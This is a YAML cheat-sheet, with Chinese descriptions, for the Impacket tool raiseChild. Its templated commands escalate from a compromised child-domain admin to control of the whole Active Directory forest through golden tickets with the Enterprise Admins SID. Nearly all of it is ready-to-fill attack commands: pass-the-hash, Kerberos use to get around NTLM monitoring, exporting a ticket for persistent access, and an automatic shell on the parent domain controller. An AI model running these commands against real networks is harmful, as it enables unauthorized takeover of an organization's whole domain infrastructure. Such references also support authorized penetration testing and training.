tool: impacket-raiseChild
tags: [active-directory, pentest, privilege-escalation, impacket, security, kerberos, domain-admin]

actions:
  # === BASIC ESCALATION ===
  - title: impacket-raiseChild - 基本的子域到林权限提升
    desc: |
      此命令发起从子域到林根域的权限提升过程。
      它通过识别信任关系并自动创建带有 Enterprise Admins 组 SID 的黄金票据来工作。
      这主要用于当你已攻陷子域中的域管理员帐户并希望获得对整个林的完全控制时。
    command: "impacket-raiseChild {{domain}}/{{username}}:{{password}}@{{target_ip}}"

  - title: impacket-raiseChild - 使用 NTLM 哈希进行提升
    desc: |
      使用 NTLM 哈希而非明文密码执行权限提升攻击。
      在传递哈希场景中，当子域管理员的明文密码不可用时，这是一项必不可少的技术。
      哈希必须以 LMHASH:NTHASH 格式提供（例如 aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0）。
    command: "impacket-raiseChild -hashes {{lmhash:nthash}} {{domain}}/{{username}}@{{target_ip}}"

  # === ADVANCED AUTHENTICATION & PERSISTENCE ===
  - title: impacket-raiseChild - 使用 Kerberos 身份验证进行提升
    desc: |
      使用 Kerberos 票据而非 NTLM 进行身份验证。
      这需要一个有效的 Kerberos 缓存（ccache）文件，并正确设置环境变量 KRB5CCNAME。
      使用 Kerberos 有助于绕过禁用 NTLM 或对异常行为进行严密监控的环境。
    command: "impacket-raiseChild -k -no-pass {{domain}}/{{username}}@{{target_ip}}"

  - title: impacket-raiseChild - 将黄金票据导出到文件
    desc: |
      生成针对林根的提升黄金票据，并将其保存到指定文件路径。
      之后可将 KRB5CCNAME 变量指向该保存的文件，与 secretsdump 或 psexec 等其他 Impacket 工具一起使用。
      这是在无需再次运行漏洞利用的情况下维持对林根持久访问的高效方法。
    command: "impacket-raiseChild -w {{output_path|forest_admin.ccache}} {{domain}}/{{username}}:{{password}}@{{target_ip}}"

  # === TARGETING & EXECUTION ===
  - title: impacket-raiseChild - 指定目标用户 RID
    desc: |
      在提升过程中指定要在父域中模拟的目标用户 RID。
      默认情况下，该工具针对 RID 为 500 的 Administrator 帐户，这是获得完全控制的最常见路径。
      如果默认 Administrator 帐户被重命名、禁用，或你需要模拟其他高权限用户，更改 RID 会很有用。
    command: "impacket-raiseChild -targetRID {{rid|500}} {{domain}}/{{username}}:{{password}}@{{target_ip}}"

  - title: impacket-raiseChild - 在林根上自动执行
    desc: |
      提升成功后，自动在目标林根域控制器上执行半交互式 shell。
      其功能类似于 psexec，使用新生成的高权限凭据立即获得命令执行能力。
      target-exec 参数使用父域控制器的 IP 地址或主机名。
    command: "impacket-raiseChild -target-exec {{parent_dc_ip}} {{domain}}/{{username}}:{{password}}@{{target_ip}}"

  # === TROUBLESHOOTING ===
  - title: impacket-raiseChild - 启用调试日志
    desc: |
      以启用详细调试输出的方式运行提升工具。
      这对于排查连接问题、RPC 错误或理解 SID 历史注入为何失败至关重要。
      它提供有关脚本执行的底层协议和步骤的详细信息。
    command: "impacket-raiseChild -debug {{domain}}/{{username}}:{{password}}@{{target_ip}}"
